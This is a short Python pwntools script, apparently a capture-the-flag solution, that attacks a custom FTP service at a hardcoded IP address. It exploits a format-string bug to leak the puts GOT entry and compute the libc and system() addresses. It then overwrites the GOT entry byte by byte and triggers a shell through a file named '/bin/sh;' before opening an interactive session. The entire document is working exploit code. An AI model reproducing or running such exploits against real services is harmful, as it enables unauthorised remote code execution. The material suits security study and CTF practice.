#!/usr/bin/python
# @auther baseline
# github : https://github.com/windyware


from pwn import *

io = remote("121.194.2.42", 8001)

def put_file(io, name, content):
	io.recvuntil("ftp>")
	io.writeline("put")
	io.recvuntil(":")
	io.writeline(name)
	io.recvuntil(":")
	io.writeline(content)

def dir_file(io):
	io.recvuntil("ftp>")
	io.writeline("dir")

def get_file(io, name):
	io.recvuntil("ftp>")
	io.writeline("get")
	io.recvuntil(":")
	io.writeline(name)

def pwn(io):
	print 'exploit begin'
	username = ''.join([chr(ord(c)-1) for c in 'sysbdmin'])	

	io.recvuntil('Name (ftp.hacker.server:Rainism):');
	io.writeline(username)

	got_malloc = 0x0804a024
	got_puts = 0x0804a028

	name = 'aaaa'
	#content =  p32(malloc_got)+'%6$s.'
	#content =  'A'*4+'B'*4+'C'*4+'%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x...'
	#content =  'A'*4+'B'*4+'C'*4+'%7$08x...'

	content = p32(got_puts)+'%7$s...'	
	put_file(io, name, content)
	get_file(io, name)
	
	data = io.recvuntil('...')
	#print len(data)
	#print [c for c in data]

	addr_puts = u32(data[4:8])
	
	print 'puts_addr: ',hex(addr_puts)

	# get addr of libc by puts addr
	# addr_libc = addr_puts - offset_puts 
	offset_puts = 0x0005fca0
	addr_libc = addr_puts - offset_puts

	
	# get addr of system by libc addr
	# addr_system = addr_libc + offset_system
	offset_system  = 0x0003ada0
	addr_system = addr_libc + offset_system
	#
	print 'system addr: '+hex(addr_system)
	addr_info = ''
	padding_info = ''
	system_addr_buff = p32(addr_system)
	offset = 4*4
	begin_index = 7
	for i in range(4):
		addr_info += p32(got_puts + i)
		val = ord(system_addr_buff[i])
		count = val - offset
		if count <= 0:
			count += 0x100
	
		padding_info += "%%%dc"%count + "%%%d$hhn"%(begin_index + i)
		offset = val	
		
	#print content
	name = '/bin/sh;'
	content = addr_info + padding_info
	put_file(io, name, content)
	
	get_file(io, name)

	dir_file(io)

	io.interactive()
	pass


pwn(io)
